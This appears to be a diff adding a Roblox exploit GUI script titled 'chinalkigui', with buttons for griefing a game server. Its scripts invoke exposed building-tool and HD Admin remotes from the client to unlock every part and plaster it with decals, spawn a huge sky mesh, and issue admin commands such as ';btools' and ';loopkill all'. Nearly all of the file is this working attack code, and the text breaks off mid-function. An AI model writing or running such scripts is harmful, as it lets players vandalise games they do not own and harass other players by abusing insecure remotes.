@@ -1,0 +1,1547 @@
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local ImageLabel = Instance.new("ImageLabel")
+local ScrollingFrame = Instance.new("ScrollingFrame")
+local Frame_2 = Instance.new("Frame")
+local TextButton = Instance.new("TextButton")
+local TextButton_2 = Instance.new("TextButton")
+local TextButton_3 = Instance.new("TextButton")
+local TextButton_4 = Instance.new("TextButton")
+local TextButton_5 = Instance.new("TextButton")
+local spamzam = Instance.new("TextButton")
+local TextButton_6 = Instance.new("TextButton")
+local TextButton_7 = Instance.new("TextButton")
+local TextButton_8 = Instance.new("TextButton")
+local TextButton_9 = Instance.new("TextButton")
+local TextButton_10 = Instance.new("TextButton")
+local TextButton_11 = Instance.new("TextButton")
+local TextButton_12 = Instance.new("TextButton")
+local TextButton_13 = Instance.new("TextButton")
+local TextButton_14 = Instance.new("TextButton")
+local TextButton_15 = Instance.new("TextButton")
+local TextButton_16 = Instance.new("TextButton")
+local TextButton_17 = Instance.new("TextButton")
+local TextButton_18 = Instance.new("TextButton")
+local TextButton_19 = Instance.new("TextButton")
+local TextButton_20 = Instance.new("TextButton")
+local TextButton_21 = Instance.new("TextButton")
+local TextButton_22 = Instance.new("TextButton")
+local TextLabel = Instance.new("TextLabel")
+
+-- Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.ResetOnSpawn = false
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.261083752, 0, 0.299572051, 0)
+Frame.Size = UDim2.new(0, 379, 0, 431)
+
+ImageLabel.Parent = Frame
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageLabel.BorderSizePixel = 0
+ImageLabel.Position = UDim2.new(-0.0606860146, 0, 0, 0)
+ImageLabel.Size = UDim2.new(0, 402, 0, 510)
+ImageLabel.Image = "http://www.roblox.com/asset/?id=134152230953447"
+
+ScrollingFrame.Parent = ImageLabel
+ScrollingFrame.Active = true
+ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScrollingFrame.BackgroundTransparency = 1.000
+ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScrollingFrame.BorderSizePixel = 0
+ScrollingFrame.Position = UDim2.new(4.5548623e-07, 0, 0.0745098069, 0)
+ScrollingFrame.Size = UDim2.new(0, 402, 0, 408)
+
+Frame_2.Parent = ScrollingFrame
+Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame_2.BackgroundTransparency = 1.000
+Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame_2.BorderSizePixel = 0
+Frame_2.Size = UDim2.new(0, 396, 0, 1000)
+
+TextButton.Parent = Frame_2
+TextButton.BackgroundColor3 = Color3.fromRGB(0, 253, 255)
+TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.BorderSizePixel = 0
+TextButton.Position = UDim2.new(0.0398009345, 0, 0.0234524533, 0)
+TextButton.Size = UDim2.new(0, 116, 0, 50)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "decal"
+TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.TextScaled = true
+TextButton.TextSize = 14.000
+TextButton.TextWrapped = true
+
+TextButton_2.Parent = Frame_2
+TextButton_2.BackgroundColor3 = Color3.fromRGB(0, 253, 255)
+TextButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_2.BorderSizePixel = 0
+TextButton_2.Position = UDim2.new(0.380559295, 0, 0.0234524533, 0)
+TextButton_2.Size = UDim2.new(0, 116, 0, 50)
+TextButton_2.Font = Enum.Font.SourceSans
+TextButton_2.Text = "sky"
+TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_2.TextScaled = true
+TextButton_2.TextSize = 14.000
+TextButton_2.TextWrapped = true
+
+TextButton_3.Parent = Frame_2
+TextButton_3.BackgroundColor3 = Color3.fromRGB(0, 253, 255)
+TextButton_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_3.BorderSizePixel = 0
+TextButton_3.Position = UDim2.new(0.696517467, 0, 0.0234524533, 0)
+TextButton_3.Size = UDim2.new(0, 116, 0, 50)
+TextButton_3.Font = Enum.Font.SourceSans
+TextButton_3.Text = "get the btools"
+TextButton_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_3.TextScaled = true
+TextButton_3.TextSize = 14.000
+TextButton_3.TextWrapped = true
+
+TextButton_4.Parent = Frame_2
+TextButton_4.BackgroundColor3 = Color3.fromRGB(0, 253, 255)
+TextButton_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_4.BorderSizePixel = 0
+TextButton_4.Position = UDim2.new(0.0372756794, 0, 0.0879703984, 0)
+TextButton_4.Size = UDim2.new(0, 116, 0, 50)
+TextButton_4.Font = Enum.Font.SourceSans
+TextButton_4.Text = "loopkill all"
+TextButton_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_4.TextScaled = true
+TextButton_4.TextSize = 14.000
+TextButton_4.TextWrapped = true
+
+TextButton_5.Parent = Frame_2
+TextButton_5.BackgroundColor3 = Color3.fromRGB(0, 253, 255)
+TextButton_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_5.BorderSizePixel = 0
+TextButton_5.Position = UDim2.new(0.378034025, 0, 0.0879703984, 0)
+TextButton_5.Size = UDim2.new(0, 116, 0, 50)
+TextButton_5.Font = Enum.Font.SourceSans
+TextButton_5.Text = "disco"
+TextButton_5.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_5.TextScaled = true
+TextButton_5.TextSize = 14.000
+TextButton_5.TextWrapped = true
+
+spamzam.Name = "spamzam"
+spamzam.Parent = Frame_2
+spamzam.BackgroundColor3 = Color3.fromRGB(0, 253, 255)
+spamzam.BorderColor3 = Color3.fromRGB(0, 0, 0)
+spamzam.BorderSizePixel = 0
+spamzam.Position = UDim2.new(0.696517467, 0, 0.0879703984, 0)
+spamzam.Size = UDim2.new(0, 116, 0, 50)
+spamzam.Font = Enum.Font.SourceSans
+spamzam.Text = "spam spawn zombies"
+spamzam.TextColor3 = Color3.fromRGB(255, 255, 255)
+spamzam.TextScaled = true
+spamzam.TextSize = 14.000
+spamzam.TextWrapped = true
+
+TextButton_6.Parent = Frame_2
+TextButton_6.BackgroundColor3 = Color3.fromRGB(0, 253, 255)
+TextButton_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_6.BorderSizePixel = 0
+TextButton_6.Position = UDim2.new(0.0398009345, 0, 0.151894107, 0)
+TextButton_6.Size = UDim2.new(0, 116, 0, 50)
+TextButton_6.Font = Enum.Font.SourceSans
+TextButton_6.Text = "g00byd0lan Theme"
+TextButton_6.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_6.TextScaled = true
+TextButton_6.TextSize = 14.000
+TextButton_6.TextWrapped = true
+
+TextButton_7.Parent = Frame_2
+TextButton_7.BackgroundColor3 = Color3.fromRGB(0, 253, 255)
+TextButton_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_7.BorderSizePixel = 0
+TextButton_7.Position = UDim2.new(0.388135046, 0, 0.151894107, 0)
+TextButton_7.Size = UDim2.new(0, 116, 0, 50)
+TextButton_7.Font = Enum.Font.SourceSans
+TextButton_7.Text = "fire all"
+TextButton_7.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_7.TextScaled = true
+TextButton_7.TextSize = 14.000
+TextButton_7.TextWrapped = true
+
+TextButton_8.Parent = Frame_2
+TextButton_8.BackgroundColor3 = Color3.fromRGB(0, 253, 255)
+TextButton_8.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_8.BorderSizePixel = 0
+TextButton_8.Position = UDim2.new(0.696517467, 0, 0.151894107, 0)
+TextButton_8.Size = UDim2.new(0, 116, 0, 50)
+TextButton_8.Font = Enum.Font.SourceSans
+TextButton_8.Text = "unanchor"
+TextButton_8.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_8.TextScaled = true
+TextButton_8.TextSize = 14.000
+TextButton_8.TextWrapped = true
+
+TextButton_9.Parent = Frame_2
+TextButton_9.BackgroundColor3 = Color3.fromRGB(0, 253, 255)
+TextButton_9.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_9.BorderSizePixel = 0
+TextButton_9.Position = UDim2.new(0.0372756794, 0, 0.214255676, 0)
+TextButton_9.Size = UDim2.new(0, 116, 0, 50)
+TextButton_9.Font = Enum.Font.SourceSans
+TextButton_9.Text = "message"
+TextButton_9.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_9.TextScaled = true
+TextButton_9.TextSize = 14.000
+TextButton_9.TextWrapped = true
+
+TextButton_10.Parent = Frame_2
+TextButton_10.BackgroundColor3 = Color3.fromRGB(0, 253, 255)
+TextButton_10.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_10.BorderSizePixel = 0
+TextButton_10.Position = UDim2.new(0.388172805, 0, 0.214255676, 0)
+TextButton_10.Size = UDim2.new(0, 116, 0, 50)
+TextButton_10.Font = Enum.Font.SourceSans
+TextButton_10.Text = "Hint"
+TextButton_10.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_10.TextScaled = true
+TextButton_10.TextSize = 14.000
+TextButton_10.TextWrapped = true
+
+TextButton_11.Parent = Frame_2
+TextButton_11.BackgroundColor3 = Color3.fromRGB(0, 253, 255)
+TextButton_11.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_11.BorderSizePixel = 0
+TextButton_11.Position = UDim2.new(0.0398009345, 0, 0.27425769, 0)
+TextButton_11.Size = UDim2.new(0, 116, 0, 50)
+TextButton_11.Font = Enum.Font.SourceSans
+TextButton_11.Text = "Chat all"
+TextButton_11.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_11.TextScaled = true
+TextButton_11.TextSize = 14.000
+TextButton_11.TextWrapped = true
+
+TextButton_12.Parent = Frame_2
+TextButton_12.BackgroundColor3 = Color3.fromRGB(0, 253, 255)
+TextButton_12.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_12.BorderSizePixel = 0
+TextButton_12.Position = UDim2.new(0.388172805, 0, 0.27425769, 0)
+TextButton_12.Size = UDim2.new(0, 116, 0, 50)
+TextButton_12.Font = Enum.Font.SourceSans
+TextButton_12.Text = "spin all"
+TextButton_12.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_12.TextScaled = true
+TextButton_12.TextSize = 14.000
+TextButton_12.TextWrapped = true
+
+TextButton_13.Parent = Frame_2
+TextButton_13.BackgroundColor3 = Color3.fromRGB(0, 253, 255)
+TextButton_13.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_13.BorderSizePixel = 0
+TextButton_13.Position = UDim2.new(0.696517467, 0, 0.27425769, 0)
+TextButton_13.Size = UDim2.new(0, 116, 0, 50)
+TextButton_13.Font = Enum.Font.SourceSans
+TextButton_13.Text = "Blind all"
+TextButton_13.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_13.TextScaled = true
+TextButton_13.TextSize = 14.000
+TextButton_13.TextWrapped = true
+
+TextButton_14.Parent = Frame_2
+TextButton_14.BackgroundColor3 = Color3.fromRGB(0, 253, 255)
+TextButton_14.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_14.BorderSizePixel = 0
+TextButton_14.Position = UDim2.new(0.0372757576, 0, 0.392227292, 0)
+TextButton_14.Size = UDim2.new(0, 116, 0, 50)
+TextButton_14.Font = Enum.Font.SourceSans
+TextButton_14.Text = "stop spawn spamming zombies"
+TextButton_14.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_14.TextScaled = true
+TextButton_14.TextSize = 14.000
+TextButton_14.TextWrapped = true
+
+TextButton_15.Parent = Frame_2
+TextButton_15.BackgroundColor3 = Color3.fromRGB(0, 253, 255)
+TextButton_15.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_15.BorderSizePixel = 0
+TextButton_15.Position = UDim2.new(0.388135046, 0, 0.391227454, 0)
+TextButton_15.Size = UDim2.new(0, 116, 0, 50)
+TextButton_15.Font = Enum.Font.SourceSans
+TextButton_15.Text = "MY THEME"
+TextButton_15.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_15.TextScaled = true
+TextButton_15.TextSize = 14.000
+TextButton_15.TextWrapped = true
+
+TextButton_16.Parent = Frame_2
+TextButton_16.BackgroundColor3 = Color3.fromRGB(0, 253, 255)
+TextButton_16.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_16.BorderSizePixel = 0
+TextButton_16.Position = UDim2.new(0.696517348, 0, 0.391227454, 0)
+TextButton_16.Size = UDim2.new(0, 116, 0, 50)
+TextButton_16.Font = Enum.Font.SourceSans
+TextButton_16.Text = "DISCO All"
+TextButton_16.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_16.TextScaled = true
+TextButton_16.TextSize = 14.000
+TextButton_16.TextWrapped = true
+
+TextButton_17.Parent = Frame_2
+TextButton_17.BackgroundColor3 = Color3.fromRGB(0, 253, 255)
+TextButton_17.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_17.BorderSizePixel = 0
+TextButton_17.Position = UDim2.new(0.0373135954, 0, 0.333022356, 0)
+TextButton_17.Size = UDim2.new(0, 116, 0, 50)
+TextButton_17.Font = Enum.Font.SourceSans
+TextButton_17.Text = "SPAM Team"
+TextButton_17.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_17.TextScaled = true
+TextButton_17.TextSize = 14.000
+TextButton_17.TextWrapped = true
+
+TextButton_18.Parent = Frame_2
+TextButton_18.BackgroundColor3 = Color3.fromRGB(0, 253, 255)
+TextButton_18.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_18.BorderSizePixel = 0
+TextButton_18.Position = UDim2.new(0.388210565, 0, 0.333022356, 0)
+TextButton_18.Size = UDim2.new(0, 116, 0, 50)
+TextButton_18.Font = Enum.Font.SourceSans
+TextButton_18.Text = "Billboard"
+TextButton_18.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_18.TextScaled = true
+TextButton_18.TextSize = 14.000
+TextButton_18.TextWrapped = true
+
+TextButton_19.Parent = Frame_2
+TextButton_19.BackgroundColor3 = Color3.fromRGB(0, 253, 255)
+TextButton_19.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_19.BorderSizePixel = 0
+TextButton_19.Position = UDim2.new(0.693992376, 0, 0.333022356, 0)
+TextButton_19.Size = UDim2.new(0, 116, 0, 50)
+TextButton_19.Font = Enum.Font.SourceSans
+TextButton_19.Text = "roblox Avatar All"
+TextButton_19.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_19.TextScaled = true
+TextButton_19.TextSize = 14.000
+TextButton_19.TextWrapped = true
+
+TextButton_20.Parent = Frame_2
+TextButton_20.BackgroundColor3 = Color3.fromRGB(0, 253, 255)
+TextButton_20.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_20.BorderSizePixel = 0
+TextButton_20.Position = UDim2.new(0.696517467, 0, 0.213532165, 0)
+TextButton_20.Size = UDim2.new(0, 116, 0, 50)
+TextButton_20.Font = Enum.Font.SourceSans
+TextButton_20.Text = "Name All"
+TextButton_20.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_20.TextScaled = true
+TextButton_20.TextSize = 14.000
+TextButton_20.TextWrapped = true
+
+TextButton_21.Parent = Frame_2
+TextButton_21.BackgroundColor3 = Color3.fromRGB(0, 253, 255)
+TextButton_21.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_21.BorderSizePixel = 0
+TextButton_21.Position = UDim2.new(0.0349011645, 0, 0.449727416, 0)
+TextButton_21.Size = UDim2.new(0, 117, 0, 50)
+TextButton_21.Font = Enum.Font.SourceSans
+TextButton_21.Text = "LGBT MAP"
+TextButton_21.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_21.TextScaled = true
+TextButton_21.TextSize = 14.000
+TextButton_21.TextWrapped = true
+
+TextButton_22.Parent = Frame_2
+TextButton_22.BackgroundColor3 = Color3.fromRGB(0, 253, 255)
+TextButton_22.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_22.BorderSizePixel = 0
+TextButton_22.Position = UDim2.new(0.388210565, 0, 0.449727416, 0)
+TextButton_22.Size = UDim2.new(0, 242, 0, 50)
+TextButton_22.Font = Enum.Font.SourceSans
+TextButton_22.Text = "DESTROY EVERYTHING!"
+TextButton_22.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_22.TextScaled = true
+TextButton_22.TextSize = 14.000
+TextButton_22.TextWrapped = true
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.BorderSizePixel = 0
+TextLabel.Size = UDim2.new(0, 379, 0, 50)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "chinalkigui"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+
+-- Scripts:
+
+local function TPOWP_fake_script() -- TextButton.LocalScript 
+	local script = Instance.new('LocalScript', TextButton)
+
+	function decal()
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		--craaa
+		remote = tool.SyncAPI.ServerEndpoint
+		function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+		function SetCollision(part,boolean)
+			local args = {
+				[1] = "SyncCollision",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CanCollide"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function SetAnchor(boolean,part)
+			local args = {
+				[1] = "SyncAnchor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Anchored"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function CreatePart(cf,parent)
+			local args = {
+				[1] = "CreatePart",
+				[2] = "Normal",
+				[3] = cf,
+				[4] = parent
+			}
+			_(args)
+		end
+		function DestroyPart(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+		function MovePart(part,cf)
+			local args = {
+				[1] = "SyncMove",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf
+					}
+				}
+			}
+			_(args)
+		end
+		function Resize(part,size,cf)
+			local args = {
+				[1] = "SyncResize",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf,
+						["Size"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function AddMesh(part)
+			local args = {
+				[1] = "CreateMeshes",
+				[2] = {
+					[1] = {
+						["Part"] = part
+					}
+				}
+			}
+			_(args)
+		end
+
+		function SetMesh(part,meshid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["MeshId"] = "rbxassetid://"..meshid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetTexture(part, texid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["TextureId"] = "rbxassetid://"..texid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetName(part, stringg)
+			local args = {
+				[1] = "SetName",
+				[2] = {
+					[1] = part
+				},
+				[3] = stringg
+			}
+
+			_(args)
+		end
+		function MeshResize(part,size)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Scale"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function Weld(part1, part2,lead)
+			local args = {
+				[1] = "CreateWelds",
+				[2] = {
+					[1] = part1,
+					[2] = part2
+				},
+				[3] = lead
+			}
+			_(args)
+
+		end
+		function SetLocked(part,boolean)
+			local args = {
+				[1] = "SetLocked",
+				[2] = {
+					[1] = part
+				},
+				[3] = boolean
+			}
+			_(args)
+		end
+		function SetTrans(part,int)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Transparency"] = int
+					}
+				}
+			}
+			_(args)
+		end
+		function CreateSpotlight(part)
+			local args = {
+				[1] = "CreateLights",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight"
+					}
+				}
+			}
+			_(args)
+		end
+		function SyncLighting(part,brightness)
+			local args = {
+				[1] = "SyncLighting",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight",
+						["Brightness"] = brightness
+					}
+				}
+			}
+			_(args)
+		end
+		function Color(part,color)
+			local args = {
+				[1] = "SyncColor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Color"] = color --[[Color3]],
+						["UnionColoring"] = false
+					}
+				}
+			}
+			_(args)
+		end
+		function SpawnDecal(part,side)
+			local args = {
+				[1] = "CreateTextures",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal"
+					}
+				}
+			}
+
+			_(args)
+		end
+		function AddDecal(part,asset,side)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal",
+						["Texture"] = "rbxassetid://".. asset
+					}
+				}
+			}
+			_(args)
+		end
+
+		function spam(id)
+			for i,v in game.workspace:GetDescendants() do
+				if v:IsA("BasePart") then
+					spawn(function()
+						SetLocked(v,false)
+						SpawnDecal(v,Enum.NormalId.Front)
+						AddDecal(v,id,Enum.NormalId.Front)
+
+						SpawnDecal(v,Enum.NormalId.Back)
+						AddDecal(v,id,Enum.NormalId.Back)
+
+						SpawnDecal(v,Enum.NormalId.Right)
+						AddDecal(v,id,Enum.NormalId.Right)
+
+						SpawnDecal(v,Enum.NormalId.Left)
+						AddDecal(v,id,Enum.NormalId.Left)
+
+						SpawnDecal(v,Enum.NormalId.Bottom)
+						AddDecal(v,id,Enum.NormalId.Bottom)
+
+						SpawnDecal(v,Enum.NormalId.Top)
+						AddDecal(v,id,Enum.NormalId.Top)
+					end)
+				end
+			end 
+		end
+		spam("100025515993024")
+	end
+	script.Parent.MouseButton1Up:Connect(decal)
+end
+coroutine.wrap(TPOWP_fake_script)()
+local function AUXD_fake_script() -- TextButton_2.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_2)
+
+	function decal()
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		--craaa
+		remote = tool.SyncAPI.ServerEndpoint
+		function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+		function SetCollision(part,boolean)
+			local args = {
+				[1] = "SyncCollision",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CanCollide"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function SetAnchor(boolean,part)
+			local args = {
+				[1] = "SyncAnchor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Anchored"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function CreatePart(cf,parent)
+			local args = {
+				[1] = "CreatePart",
+				[2] = "Normal",
+				[3] = cf,
+				[4] = parent
+			}
+			_(args)
+		end
+		function DestroyPart(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+		function MovePart(part,cf)
+			local args = {
+				[1] = "SyncMove",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf
+					}
+				}
+			}
+			_(args)
+		end
+		function Resize(part,size,cf)
+			local args = {
+				[1] = "SyncResize",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf,
+						["Size"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function AddMesh(part)
+			local args = {
+				[1] = "CreateMeshes",
+				[2] = {
+					[1] = {
+						["Part"] = part
+					}
+				}
+			}
+			_(args)
+		end
+
+		function SetMesh(part,meshid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["MeshId"] = "rbxassetid://"..meshid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetTexture(part, texid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["TextureId"] = "rbxassetid://"..texid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetName(part, stringg)
+			local args = {
+				[1] = "SetName",
+				[2] = {
+					[1] = part
+				},
+				[3] = stringg
+			}
+
+			_(args)
+		end
+		function MeshResize(part,size)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Scale"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function Weld(part1, part2,lead)
+			local args = {
+				[1] = "CreateWelds",
+				[2] = {
+					[1] = part1,
+					[2] = part2
+				},
+				[3] = lead
+			}
+			_(args)
+
+		end
+		function SetLocked(part,boolean)
+			local args = {
+				[1] = "SetLocked",
+				[2] = {
+					[1] = part
+				},
+				[3] = boolean
+			}
+			_(args)
+		end
+		function SetTrans(part,int)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Transparency"] = int
+					}
+				}
+			}
+			_(args)
+		end
+		function CreateSpotlight(part)
+			local args = {
+				[1] = "CreateLights",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight"
+					}
+				}
+			}
+			_(args)
+		end
+		function SyncLighting(part,brightness)
+			local args = {
+				[1] = "SyncLighting",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight",
+						["Brightness"] = brightness
+					}
+				}
+			}
+			_(args)
+		end
+		function Color(part,color)
+			local args = {
+				[1] = "SyncColor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Color"] = color --[[Color3]],
+						["UnionColoring"] = false
+					}
+				}
+			}
+			_(args)
+		end
+		function SpawnDecal(part,side)
+			local args = {
+				[1] = "CreateTextures",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal"
+					}
+				}
+			}
+
+			_(args)
+		end
+		function AddDecal(part,asset,side)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal",
+						["Texture"] = "rbxassetid://".. asset
+					}
+				}
+			}
+			_(args)
+		end
+
+		function Sky(id)
+			e = char.HumanoidRootPart.CFrame.x
+			f = char.HumanoidRootPart.CFrame.y
+			g = char.HumanoidRootPart.CFrame.z
+			CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
+			for i,v in game.Workspace:GetDescendants() do
+				if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
+					--spawn(function()
+					SetName(v,"Sky")
+					AddMesh(v)
+					--end)
+					--spawn(function()
+					SetMesh(v,"111891702759441")
+					SetTexture(v,id)
+					--end)
+					MeshResize(v,Vector3.new(6000,6000,6000))
+					SetLocked(v,true)
+				end
+			end
+		end
+		Sky("134152230953447")
+	end
+	script.Parent.MouseButton1Up:Connect(decal)
+end
+coroutine.wrap(AUXD_fake_script)()
+local function WYDCMBZ_fake_script() -- TextButton_2.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_2)
+
+	function ww()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
+
+		RequestCommand:InvokeServer(";time 0")
+	end
+	script.Parent.MouseButton1Up:Connect(ww)
+end
+coroutine.wrap(WYDCMBZ_fake_script)()
+local function YGFIG_fake_script() -- TextButton_3.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_3)
+
+	function ww()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
+
+		RequestCommand:InvokeServer(";btools")
+		RequestCommand:InvokeServer(";give me b")
+	end
+	script.Parent.MouseButton1Up:Connect(ww)
+end
+coroutine.wrap(YGFIG_fake_script)()
+local function HWJRN_fake_script() -- TextButton_4.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_4)
+
+	function ww()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
+
+		RequestCommand:InvokeServer(";loopkill all")
+	end
+	script.Parent.MouseButton1Up:Connect(ww)
+end
+coroutine.wrap(HWJRN_fake_script)()
+local function MLXVV_fake_script() -- TextButton_5.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_5)
+
+	function ww()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
